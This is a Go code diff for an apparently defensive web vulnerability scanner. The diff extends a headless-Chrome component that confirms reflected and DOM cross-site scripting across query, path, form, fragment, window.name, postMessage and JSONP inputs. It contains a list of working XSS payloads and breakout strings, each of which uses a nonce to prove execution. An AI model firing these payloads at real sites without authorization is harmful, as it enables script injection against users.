@@ -4,7 +4,11 @@ import (
 	"context"
 	"crypto/rand"
 	"encoding/hex"
+	"encoding/json"
 	"fmt"
+	"net/http"
+	"net/http/httptest"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -13,6 +17,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/chromedp"
 )
 
@@ -62,6 +67,10 @@ type browserXSSConfirmer struct {
 
 	// one navigation at a time: the single tab cannot be driven concurrently.
 	navGate chan struct{}
+
+	loaderOnce  sync.Once
+	loaderURL   string
+	loaderClose func()
 }
 
 var (
@@ -121,6 +130,14 @@ func findChromePath() string {
 	for _, p := range []string{
 		"/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome",
 		"/snap/bin/chromium", "/opt/google/chrome/chrome",
+		// macOS app bundles. Reconner is frequently run directly from a Mac where
+		// Chrome is not exported on PATH; omitting these silently disabled every
+		// reflected/DOM runtime proof even though a browser was installed.
+		"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+		"/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary",
+		"/Applications/Chromium.app/Contents/MacOS/Chromium",
+		"/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
+		"/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
 	} {
 		if _, err := os.Stat(p); err == nil {
 			return p
@@ -196,6 +213,31 @@ func (b *browserXSSConfirmer) Close() {
 	if b.dataDir != "" {
 		_ = os.RemoveAll(b.dataDir)
 	}
+	if b.loaderClose != nil {
+		b.loaderClose()
+		b.loaderClose = nil
+	}
+}
+
+func (b *browserXSSConfirmer) scriptLoaderPage() string {
+	b.loaderOnce.Do(func() {
+		// A real loopback HTTP origin avoids opaque data:/about:blank Private
+		// Network Access restrictions while remaining isolated from the target.
+		// It models the attack faithfully: an external page includes the reflected
+		// endpoint as a classic cross-origin <script src> resource.
+		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			w.Header().Set("Content-Type", "text/html")
+			if r.URL.Path == "/post-message" {
+				payloadJSON, _ := json.Marshal(r.URL.Query().Get("payload"))
+				_, _ = fmt.Fprintf(w, "<script>parent.postMessage(%s, '*')</script>", payloadJSON)
+				return
+			}
+			_, _ = w.Write([]byte("<html><head><title>reconner</title></head><body></body></html>"))
+		}))
+		b.loaderURL = srv.URL
+		b.loaderClose = srv.Close
+	})
+	return b.loaderURL
 }
 
 // xssBrowserPayloads are context-spanning payloads whose executed JavaScript sets
@@ -204,13 +246,30 @@ func (b *browserXSSConfirmer) Close() {
 // contexts. Kept small so a candidate costs only a handful of navigations.
 func xssBrowserPayloads() []string {
 	return []string{
-		`"><img src=x onerror="document.title='%s'">`,
-		`"><svg onload="document.title='%s'">`,
-		`'><img src=x onerror="document.title='%s'">`,
-		`</script><script>document.title='%s'</script>`,
-		`';document.title='%s';//`,
-		`"><script>document.title='%s'</script>`,
-		`<img src=x onerror="document.title='%s'">`,
+		// Clean HTML vectors (raw-string quotes do not need backslashes).
+		`<img src=x onerror="top.document.title='%s'">`,
+		`<img src=x onerror=top.document.title='%s'>`,
+		`"><img src=x onerror="top.document.title='%s'">`,
+		`"><svg onload="top.document.title='%s'">`,
+		`'><img src=x onerror="top.document.title='%s'">`,
+		` autofocus onfocus="top.document.title='%s'" x=`,
+		`"><details open ontoggle="top.document.title='%s'">`,
+		`"><input autofocus onfocus="top.document.title='%s'">`,
+		`</textarea><svg onload="top.document.title='%s'">`,
+		`</title><svg onload="top.document.title='%s'">`,
+		`</style><svg onload="top.document.title='%s'">`,
+		`--><svg onload="top.document.title='%s'">`,
+		// JavaScript string/expression/template contexts.
+		`";top.document.title='%s';//`,
+		"${top.document.title='%s'}",
+		`;top.document.title='%s';//`,
+		"`;top.document.title='%s';//",
+		// URL attributes; the browser confirmer activates javascript: links.
+		`javascript:top.document.title='%s'`,
+		// Raw-text/script breakouts.
+		`</script><script>top.document.title='%s'</script>`,
+		`';top.document.title='%s';//`,
+		`"><script>top.document.title='%s'</script>`,
 	}
 }
 
@@ -227,6 +286,15 @@ func randNonce() string {
 // (chromedp cannot reliably observe alert dialogs). ok=false means no execution was
 // observed (not vulnerable, or safely encoded/escaped by the app).
 func (b *browserXSSConfirmer) Confirm(parent context.Context, rawURL, param string) (payload string, ok bool) {
+	return b.ConfirmInsertion(parent, insertionPoint{URL: rawURL, Param: param, Method: "GET", Location: "query"}, nil)
+}
+
+// ConfirmInsertion proves execution using the insertion point's real placement.
+// Query-only navigation silently missed path parameters and POST forms; those now
+// reach Chromium as a real path navigation or top-level form submission. JSON
+// bodies are not emulated as document navigations because fetch() does not render
+// a JSON response and pretending it does would create false positives.
+func (b *browserXSSConfirmer) ConfirmInsertion(parent context.Context, ip insertionPoint, auth map[string]string) (payload string, ok bool) {
 	if b == nil {
 		return "", false
 	}
@@ -236,10 +304,56 @@ func (b *browserXSSConfirmer) Confirm(parent context.Context, rawURL, param stri
 		}
 		nonce := randNonce()
 		pl := fmt.Sprintf(tmpl, nonce)
-		u := injectParam(rawURL, param, pl)
-		if b.fire(parent, u, nonce) {
+		method := strings.ToUpper(strings.TrimSpace(ip.Method))
+		fired := false
+		switch {
+		case method == "POST" && strings.Contains(strings.ToLower(ip.ContentType), "json"):
+			continue
+		case method == "POST":
+			values := siblingValues(ip.URL)
+			values.Set(ip.Param, pl)
+			fired = b.fireForm(parent, stripQuery(ip.URL), values, auth, nonce)
+		default:
+			req, err := buildInjectedRequest(parent, ip, pl, auth)
+			if err == nil {
+				fired = b.fireWithHeaders(parent, req.URL.String(), auth, nonce)
+			}
+		}
+		if fired {
 			// same vector, but pop alert(document.domain) for the human PoC.
-			return strings.ReplaceAll(tmpl, `document.title='%s'`, `alert(document.domain)`), true
+			return strings.ReplaceAll(tmpl, `top.document.title='%s'`, `alert(document.domain)`), true
+		}
+	}
+	return "", false
+}
+
+// ConfirmScriptResource proves reflected XSS in a JavaScript/JSONP endpoint by
+// loading the injected response as an actual external script. Navigating directly
+// to application/javascript only displays source and used to produce a systematic
+// miss. The browser now evaluates the resource in a clean document and the same
+// random-title nonce makes reflection alone insufficient as proof.
+func (b *browserXSSConfirmer) ConfirmScriptResource(parent context.Context, ip insertionPoint, auth map[string]string) (payload string, ok bool) {
+	if b == nil || strings.EqualFold(strings.TrimSpace(ip.Method), "POST") {
+		return "", false
+	}
+	for _, tmpl := range []string{
+		`top.document.title='%s'//`,
+		`;top.document.title='%s';//`,
+		`');top.document.title='%s';//`,
+		`"};top.document.title='%s';//`,
+		`);top.document.title='%s';//`,
+	} {
+		if parent.Err() != nil {
+			return "", false
+		}
+		nonce := randNonce()
+		pl := fmt.Sprintf(tmpl, nonce)
+		req, err := buildInjectedRequest(parent, ip, pl, auth)
+		if err != nil {
+			continue
+		}
+		if b.fireScriptResource(parent, req.URL.String(), auth, nonce) {
+			return strings.ReplaceAll(tmpl, `top.document.title='%s'`, `alert(document.domain)`), true
 		}
 	}
 	return "", false
@@ -282,7 +396,7 @@ func (b *browserXSSConfirmer) DOMReflects(parent context.Context, rawURL, param 
 // observing it actually run in a real browser. This is real proof of DOM XSS — the
 // value flows from an attacker-controlled URL source, through the app's JS, into a
 // sink, and executes. Returns the alert-equivalent payload for the report PoC.
-func (b *browserXSSConfirmer) ConfirmDOMSource(parent context.Context, pageURL, mode string) (payload string, ok bool) {
+func (b *browserXSSConfirmer) ConfirmDOMSource(parent context.Context, pageURL, mode, param string, auth map[string]string) (payload string, ok bool) {
 	if b == nil {
 		return "", false
 	}
@@ -293,23 +407,120 @@ func (b *browserXSSConfirmer) ConfirmDOMSource(parent context.Context, pageURL, 
 		}
 		nonce := randNonce()
 		pl := fmt.Sprintf(tmpl, nonce)
-		var u string
-		if mode == "hash" {
-			u = base + "#" + pl
-		} else {
-			u = injectParam(base, "rcx", pl)
+		fired := false
+		switch mode {
+		case "hash":
+			// Cover raw fragments, hash routers and URLSearchParams-over-hash. A
+			// single #payload shape systematically missed #/route, #!/route and
+			// #name=value consumers even though their source→sink flow was real.
+			placements := []string{}
+			if param != "" {
+				// A fragment parsed via URLSearchParams needs a fully URL-encoded
+				// value; minimal query escaping leaves `=`/quotes ambiguous here.
+				placements = append(placements, "#"+url.QueryEscape(param)+"="+url.QueryEscape(pl))
+			}
+			placements = append(placements, "#"+pl, "#/"+pl, "#!/"+pl)
+			for _, suffix := range placements {
+				if b.fireWithHeaders(parent, base+suffix, auth, nonce) {
+					fired = true
+					break
+				}
+			}
+		case "query":
+			if param == "" {
+				param = "rcx"
+			}
+			fired = b.fireWithHeaders(parent, injectParam(base, param, pl), auth, nonce)
+		case "window.name":
+			fired = b.fireWindowName(parent, base, pl, auth, nonce)
+		case "postMessage":
+			fired = b.firePostMessage(parent, base, pl, auth, nonce)
+		case "path":
+			req, err := buildInjectedRequest(parent, insertionPoint{URL: base, Method: "GET", Location: param}, pl, auth)
+			if err == nil {
+				fired = b.fireWithHeaders(parent, req.URL.String(), auth, nonce)
+			}
 		}
-		if b.fire(parent, u, nonce) {
-			return strings.ReplaceAll(tmpl, `document.title='%s'`, `alert(document.domain)`), true
+		if fired {
+			return strings.ReplaceAll(tmpl, `top.document.title='%s'`, `alert(document.domain)`), true
 		}
 	}
 	return "", false
+}
+
+func (b *browserXSSConfirmer) fireWindowName(parent context.Context, pageURL, payload string, headers map[string]string, nonce string) bool {
+	select {
+	case b.navGate <- struct{}{}:
+		defer func() { <-b.navGate }()
+	case <-parent.Done():
+		return false
+	}
+	tab, ok := b.ensureTab()
+	if !ok {
+		return false
+	}
+	ctx, cancel := context.WithTimeout(tab, 15*time.Second)
+	defer cancel()
+	set := network.Headers{}
+	for k, v := range headers {
+		if !strings.EqualFold(k, "content-type") && v != "" {
+			set[k] = v
+		}
+	}
+	defer func() { _ = chromedp.Run(tab, network.SetExtraHTTPHeaders(network.Headers{})) }()
+	payloadJSON, _ := json.Marshal(payload)
+	if err := chromedp.Run(ctx, network.Enable(), network.SetExtraHTTPHeaders(set),
+		chromedp.Navigate("about:blank"), chromedp.Evaluate(`window.name=`+string(payloadJSON), nil),
+		chromedp.Navigate(pageURL)); err != nil {
+		return false
+	}
+	return strings.TrimSpace(b.waitForExecution(ctx, nonce)) == nonce
+}
+
+// firePostMessage uses an opaque-origin data: iframe as the attacker page. A
+// synthetic MessageEvent from the target itself would bypass the browser's origin
+// model and could false-confirm guarded code; a real child frame postMessage keeps
+// the proof faithful to what an external origin can deliver.
+func (b *browserXSSConfirmer) firePostMessage(parent context.Context, pageURL, payload string, headers map[string]string, nonce string) bool {
+	select {
+	case b.navGate <- struct{}{}:
+		defer func() { <-b.navGate }()
+	case <-parent.Done():
+		return false
+	}
+	tab, ok := b.ensureTab()
+	if !ok {
+		return false
+	}
+	ctx, cancel := context.WithTimeout(tab, 15*time.Second)
+	defer cancel()
+	set := network.Headers{}
+	for k, v := range headers {
+		if !strings.EqualFold(k, "content-type") && v != "" {
+			set[k] = v
+		}
+	}
+	defer func() { _ = chromedp.Run(tab, network.SetExtraHTTPHeaders(network.Headers{})) }()
+	if err := chromedp.Run(ctx, network.Enable(), network.SetExtraHTTPHeaders(set), chromedp.Navigate(pageURL)); err != nil {
+		return false
+	}
+	src := b.scriptLoaderPage() + "/post-message?payload=" + url.QueryEscape(payload)
+	srcJSON, _ := json.Marshal(src)
+	script := `(()=>{const f=document.createElement('iframe');f.hidden=true;f.src=` + string(srcJSON) + `;document.body.appendChild(f)})()`
+	if err := chromedp.Run(ctx, chromedp.Evaluate(script, nil)); err != nil {
+		return false
+	}
+	return strings.TrimSpace(b.waitForExecution(ctx, nonce)) == nonce
 }
 
 // fire navigates the single shared tab to url and returns whether the payload's
 // JavaScript executed (document.title became nonce). Navigations are serialized on
 // navGate because there is only one tab.
 func (b *browserXSSConfirmer) fire(parent context.Context, url, nonce string) bool {
+	return b.fireWithHeaders(parent, url, nil, nonce)
+}
+
+func (b *browserXSSConfirmer) fireWithHeaders(parent context.Context, rawURL string, headers map[string]string, nonce string) bool {
 	select {
 	case b.navGate <- struct{}{}:
 		defer func() { <-b.navGate }()
@@ -325,14 +536,107 @@ func (b *browserXSSConfirmer) fire(parent context.Context, url, nonce string) bo
 	ctx, cancel := context.WithTimeout(tab, 12*time.Second)
 	defer cancel()
 
-	var title string
-	// Navigate, give post-load handlers (onerror/onload, hydration) time to run,
-	// then read the title. Errors are ignored on purpose — a partial load can still
-	// have executed the payload, and Evaluate then reports the proof.
-	_ = chromedp.Run(ctx,
-		chromedp.Navigate(url),
-		chromedp.Sleep(1100*time.Millisecond),
-		chromedp.Evaluate(`document.title`, &title),
-	)
+	set := network.Headers{}
+	for k, v := range headers {
+		if !strings.EqualFold(k, "content-type") && v != "" {
+			set[k] = v
+		}
+	}
+	defer func() { _ = chromedp.Run(tab, network.SetExtraHTTPHeaders(network.Headers{})) }()
+	_ = chromedp.Run(ctx, network.Enable(), network.SetExtraHTTPHeaders(set), chromedp.Navigate(rawURL))
+	title := b.waitForExecution(ctx, nonce)
 	return strings.TrimSpace(title) == nonce
+}
+
+func (b *browserXSSConfirmer) fireScriptResource(parent context.Context, resourceURL string, headers map[string]string, nonce string) bool {
+	select {
+	case b.navGate <- struct{}{}:
+		defer func() { <-b.navGate }()
+	case <-parent.Done():
+		return false
+	}
+	tab, ok := b.ensureTab()
+	if !ok {
+		return false
+	}
+	ctx, cancel := context.WithTimeout(tab, 15*time.Second)
+	defer cancel()
+	set := network.Headers{}
+	for k, v := range headers {
+		if !strings.EqualFold(k, "content-type") && v != "" {
+			set[k] = v
+		}
+	}
+	defer func() { _ = chromedp.Run(tab, network.SetExtraHTTPHeaders(network.Headers{})) }()
+	resourceJSON, _ := json.Marshal(resourceURL)
+	loader := `(()=>{const s=document.createElement('script');s.src=` + string(resourceJSON) + `;document.head.appendChild(s)})()`
+	loaderURL := b.scriptLoaderPage()
+	if loaderURL == "" {
+		return false
+	}
+	if err := chromedp.Run(ctx,
+		network.Enable(), network.SetExtraHTTPHeaders(set),
+		chromedp.Navigate(loaderURL),
+		chromedp.Evaluate(loader, nil)); err != nil {
+		return false
+	}
+	return strings.TrimSpace(b.waitForExecution(ctx, nonce)) == nonce
+}
+
+func (b *browserXSSConfirmer) fireForm(parent context.Context, action string, values url.Values, headers map[string]string, nonce string) bool {
+	select {
+	case b.navGate <- struct{}{}:
+		defer func() { <-b.navGate }()
+	case <-parent.Done():
+		return false
+	}
+	tab, ok := b.ensureTab()
+	if !ok {
+		return false
+	}
+	ctx, cancel := context.WithTimeout(tab, 15*time.Second)
+	defer cancel()
+	set := network.Headers{}
+	for k, v := range headers {
+		if !strings.EqualFold(k, "content-type") && v != "" {
+			set[k] = v
+		}
+	}
+	defer func() { _ = chromedp.Run(tab, network.SetExtraHTTPHeaders(network.Headers{})) }()
+	parsed, err := url.Parse(action)
+	if err != nil {
+		return false
+	}
+	origin := parsed.Scheme + "://" + parsed.Host + "/"
+	actionJSON, _ := json.Marshal(action)
+	valuesJSON, _ := json.Marshal(values)
+	script := fmt.Sprintf(`(()=>{const a=%s,v=%s,f=document.createElement('form');f.method='POST';f.action=a;for(const [k,vs] of Object.entries(v)){for(const x of vs){const i=document.createElement('input');i.type='hidden';i.name=k;i.value=x;f.appendChild(i)}}document.body.appendChild(f);f.submit()})()`, actionJSON, valuesJSON)
+	_ = chromedp.Run(ctx, network.Enable(), network.SetExtraHTTPHeaders(set), chromedp.Navigate(origin), chromedp.Evaluate(script, nil))
+	title := b.waitForExecution(ctx, nonce)
+	return strings.TrimSpace(title) == nonce
+}
+
+func (b *browserXSSConfirmer) waitForExecution(ctx context.Context, nonce string) string {
+	// Trigger interaction-required javascript: URL vectors and autofocus handlers,
+	// then poll for async/hydrated sinks instead of using a fixed one-second sleep.
+	_ = chromedp.Run(ctx, chromedp.Sleep(250*time.Millisecond))
+	triggerXSSInteractions(ctx, nonce)
+	// Poll is a chromedp action and must run through chromedp.Run so the CDP
+	// executor is attached to the context. Calling Action.Do(ctx) directly panics
+	// in current chromedp (nil cdp.Executor), which previously crashed live XSS
+	// scans as soon as a Mac/Linux browser was actually available.
+	_ = chromedp.Run(ctx, chromedp.Poll(`document.title === `+strconv.Quote(nonce), nil,
+		chromedp.WithPollingInterval(100*time.Millisecond), chromedp.WithPollingTimeout(1250*time.Millisecond)))
+	var title string
+	_ = chromedp.Run(ctx, chromedp.Evaluate(`document.title`, &title))
+	return title
+}
+
+func triggerXSSInteractions(ctx context.Context, nonce string) {
+	nonceJSON, _ := json.Marshal(nonce)
+	// Interact only with nodes whose inline handler/URL contains this scan's random
+	// nonce. That exercises focus/click/toggle/pointer payloads without clicking
+	// unrelated application controls or causing side effects on the target.
+	triggerJS := `(()=>{const n=` + string(nonceJSON) + `;for(const e of document.querySelectorAll('*')){for(const a of [...e.attributes]){if(!a.value.includes(n))continue;try{if(a.name==='href'&&a.value.toLowerCase().startsWith('javascript:'))e.click();else if(a.name==='autofocus')e.focus();else if(a.name.startsWith('on')){const t=a.name.slice(2);if(t==='focus')e.focus();else if(t==='click')e.click();else{e.dispatchEvent(new Event(t,{bubbles:true}))}}}catch(_){}}}})()`
+	_ = chromedp.Run(ctx, chromedp.Evaluate(triggerJS, nil))
 }
